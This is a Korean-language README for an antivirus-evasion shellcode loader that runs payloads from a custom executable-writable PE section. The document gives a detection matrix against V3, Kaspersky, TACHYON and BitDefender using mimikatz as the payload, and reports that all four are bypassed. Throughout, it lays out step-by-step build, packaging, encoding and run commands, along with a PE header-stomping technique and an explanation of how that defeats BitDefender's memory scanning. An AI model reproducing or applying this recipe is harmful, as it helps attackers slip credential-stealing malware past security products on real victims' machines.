# Section_loader — 커스텀 ERW 섹션 기반 셸코드 로더 매트릭스

`test`라는 이름의 커스텀 PE 섹션(Execute + Read + Write)을 로더 exe 자체에 심어두고, 런타임에 이 섹션으로 페이로드를 로드/디코드 후 진입하는 방식의 로더 계열. 벤더별 반응 매트릭스 축적용.

관련: [`/home/malware/code/PE-MAPPING/EVASION_REPORT.md`](../PE-MAPPING/EVASION_REPORT.md) (관리형 로더 계열).

---

## 파일 구조

| 파일 | 인코딩 | 매핑 주체 | 용도 |
|------|--------|-----------|------|
| `Section.c` | XOR 0x55 | 외부 (Donut/PeBinForge) | 최소 기준 로더 |
| `Section_hsf.c` | HSF (IPv4/IPv6/MAC 텍스트) + FNV-1a 무결성 | 외부 | HSF 인코딩 축 실험 |

두 로더 모두 실행 흐름 동일:
```
main(hsf|bin) → test 섹션 위치 파악 (PEB → PE 헤더) → 파일 로드 → 복호화 → jump
```

---

## 실행 파이프라인 (권장 조합)

```
[원본 EXE]  →  [PeBinForge]  →  [.bin]  →  [HSF 인코더]  →  [.hsf]  →  Section_loader 실행
                                                                        │
                                                                        ▼
                                                    ERW test 섹션에 .bin 로드
                                                    XOR/HSF 디코드
                                                    jump → PeBinForge 셸코드 부팅
                                                    → 자체 PIC PE 매퍼가 원본 EXE 매핑
                                                    → 페이로드 실행
```

PeBinForge 대신 Donut 사용도 가능 (매트릭스 축의 하나).

---

## 벤더별 실측 매트릭스 (mimikatz 페이로드 기준)

**중요 프레이밍**: V3 / Kaspersky / TACHYON 3벤더 통과는 **Section_loader 아키텍처 자체의 특성** (커스텀 ERW 섹션 + PE 헤더에 심어둔 실행 페이지). 아래 표의 인코딩/부트스트랩 축 실험 모두 이 3벤더에 대해선 이미 baseline으로 통과. **BitDefender 열만 유일하게 실패했고, 헤더 스톰프가 BD-only 대응책**.

| 로더 조합 | V3 | Kaspersky | TACHYON | BitDefender |
|-----------|-----|-----------|---------|-------------|
| Section + XOR + Donut+mimikatz | ✓ | ✓ | ✓ | ✗ (배너 후 탐지) |
| Section + HSF IPv4 + Donut+mimikatz | ✓ | ✓ | ✓ | ✗ (동일 시점) |
| Section + PeBinForge+mimikatz (기본) | ✓ | ✓ | ✓ | ✗ (동일 시점) |
| Section + PeBinForge + JIT decrypt (.rdata) | ✓ | ✓ | ✓ | ✗ (동일 시점) |
| **Section + PeBinForge + Header stomp** | ✓ | ✓ | ✓ | **✓** |

**해석**:
- **Section_loader 자체 = V3/Kaspersky/TACHYON에 대한 근본 우회**. 인코딩·부트스트랩을 뭘로 바꿔도 3벤더는 계속 통과.
- **Header stomp = BD 전용 추가 계층**. Section_loader의 3벤더 통과 특성에 BD를 얹기 위한 마지막 조각.
- BD가 다른 3벤더보다 memory scan 강도가 유의미하게 높다는 벤더 특성 데이터.

**연대별 확정 (2026-09-25)**: Section + PeBinForge + Header stomp 조합으로 4벤더 모두 통과 달성.

관련 기록:
- V3 native 통과 조합: `PE-MAPPING/loader_final2.cpp` + header stomp + XOR-at-rest + Sleep 3~5초 + Fiber (2026-09-15, `project_v3_detection_matrix.md`) — **loader_final2는 native reflective mapping 계열**, Section_loader와는 다른 축.
- 헤더 스톰프는 loader_final2(V3)와 PeBinForge(BD) 두 매핑 계열 모두에서 유효 확인. 매핑 로더가 헤더를 소유하고 있을 때만 적용 가능한 계층.

---

## 사용법 (Quick Start)

BD 통과 조합(=성공 확인된 조합)을 처음부터 재현하려면:

### 0. 사전 준비
- Windows 10/11 x64 VM (스냅샷 정리된 상태 권장)
- Visual Studio 2022 Build Tools + Windows SDK
- MSVC Developer Command Prompt (x64)
- PeBinForge 소스 클론 (예: `C:\PeBinForge\`)
- 원본 페이로드 EXE (예: `mimikatz.exe`)
- HSF 인코더 (프로젝트 내부 도구)

### 1. Section_loader 빌드
```cmd
cd C:\path\to\Section_loader
cl /std:c11 /O2 Section_hsf.c
:: 산출: Section_hsf.exe
```

### 2. PeBinForge 빌드 (헤더 스톰프 활성)
```powershell
cd C:\PeBinForge
.\build.ps1
:: 산출: build\pbf.exe (헤더 스톰프 ON = 기본값)
```

baseline (스톰프 OFF) 별도로 필요하면:
```cmd
nmake -f Makefile.msvc CFLAGS="/DENABLE_HEADER_STOMP=0"
```

### 3. 페이로드 패키징
```cmd
cd C:\PeBinForge
.\build\pbf.exe pack C:\payloads\mimikatz.exe C:\payloads\mimikatz.bin --force
:: mimikatz.exe와 같은 폴더에 필요한 비시스템 DLL 두기
```

### 4. HSF 인코딩
```cmd
:: 프로젝트 인코더로 mimikatz.bin -> mimikatz.hsf 변환
:: 포맷: IPv4 모드 권장 (텍스트 파일처럼 보임)
```

### 5. 실행
```cmd
Section_hsf.exe mimikatz.hsf
```

**기대 출력**:
```
[*] test section VA  : 0x...
[*] test section size: 0x160000
[+] HSF decoded: N bytes (mode=1)
[*] Jump: 0x... (N bytes payload)

  .#####.   mimikatz 2.2.0 ...
mimikatz # <입력 대기>
```

BD 있는 환경에서 배너 후 REPL 대기까지 살아 있으면 통과 확정.

### A/B 격리 실험 (매트릭스 데이터 축적)
아래 "실험 절차" 섹션 참고.

---

## 빌드

### Section 로더 (Windows, MSVC Developer Command Prompt)

```cmd
cl /std:c11 /O2 Section.c        :: XOR 0x55
cl /std:c11 /O2 Section_hsf.c    :: HSF IPv4/IPv6/MAC
```

### PeBinForge (Windows)

```powershell
cd C:\path\to\PeBinForge
.\build.ps1                                              # 기본 (헤더 스톰프 ON)
nmake -f Makefile.msvc CFLAGS="/DENABLE_HEADER_STOMP=0"  # baseline (스톰프 OFF)
```

`native/pic_stub.c`의 `ENABLE_HEADER_STOMP` 플래그로 A/B 격리:
- `=1` (기본): 매핑된 페이로드 PE 헤더 zero-out → BD 스캐너의 섹션 로케이션 무력화
- `=0`: 순수 baseline, 스톰프 코드 자체가 컴파일에서 배제 (IOC 오염 없음)

### HSF 인코딩

프로젝트의 자체 인코더 사용 (별도 도구, 이 README 범위 밖).
포맷: `[magic "HSF1"][ver=1][mode][rsv=0,0][u64 orig_size][u64 count][u64 fnv_hash][records]`

records 형식: 반복 `[u16 text_len][text_len 바이트 ASCII (예: "192.168.1.1")]`

---

## 실험 절차 (매트릭스 A/B 격리)

```
1. baseline 빌드:
   nmake -f Makefile.msvc CFLAGS="/DENABLE_HEADER_STOMP=0"
   → mimikatz_baseline.bin

2. stomp 빌드:
   nmake -f Makefile.msvc CFLAGS="/DENABLE_HEADER_STOMP=1"
   → mimikatz_stomp.bin

3. 각각 HSF 인코딩:
   → mimikatz_baseline.hsf, mimikatz_stomp.hsf

4. Section_hsf.exe로 실행:
   Section_hsf.exe mimikatz_baseline.hsf   → BD 탐지 (예상)
   Section_hsf.exe mimikatz_stomp.hsf      → BD 통과 (확인됨)

5. 두 결과 비교 → 헤더 스톰프가 결정적 요인 격리 확정.
```

VM 스냅샷 롤백 사이 두 실험을 격리 실행할 것 (BD 로컬 상태 오염 방지).

---

## 결과 해석

### 헤더 스톰프가 왜 BD에서 효과적인가

BD 메모리 스캐너는 매핑된 페이로드 PE의 헤더를 앵커로 삼아:
- `NumberOfSections` 파싱
- 각 섹션의 `VirtualAddress` / `VirtualSize` 로 `.text` / `.rdata` 위치 결정
- 해당 영역만 시그니처 매치

헤더 제로화 시:
- PE로 인식 안 됨 → 섹션 파싱 실패
- Raw byte 스캔으로 fallback해도 정확도 낮음
- mimikatz `.text` / `.rdata` 시그니처 매치 실패

### BD 대응으로 시도했으나 무효였던 접근 (negative results)

다음 모두 **BD에 대해 무효** (V3/Kaspersky/TACHYON는 이미 Section_loader 자체로 통과):

- 인코딩 방식 교체 (XOR ↔ HSF IPv4): 파일 계층 지문만 바꿈, BD memory scan 시점 무관
- 셸코드 부트스트랩 교체 (Donut ↔ PeBinForge): BD 탐지에 무관 (payload memory 시그니처가 결정적)
- JIT decrypt on `.rdata`: 단독으론 부족 (재암호화 사이클 없어서 결국 노출)

BD 열에서 유일하게 유효했던 것은 **Header stomp 하나**. 다른 3벤더는 이 계층 없이도 통과했으므로 header stomp는 순수 BD-specific 대응.

---

## Out of Scope

- 실제 외부 타겟 배포
- 페이로드 소스 수정 (mimikatz 원본 유지 원칙)
- 벤더 공식 서명 위조
- BD Enterprise/GravityZone (커널 필터 강화판) 미측정 — Home/Total Security 급 대상

---

## 참고

- 프로젝트 컨텍스트: `/home/malware/code/AGENTS.md`
- 관리형 로더 실험: `/home/malware/code/PE-MAPPING/EVASION_REPORT.md`
- V3 통과 조합 근거: memory `project_v3_detection_matrix.md`
- PeBinForge 프로젝트 자체 문서: `/path/to/PeBinForge/README.md`
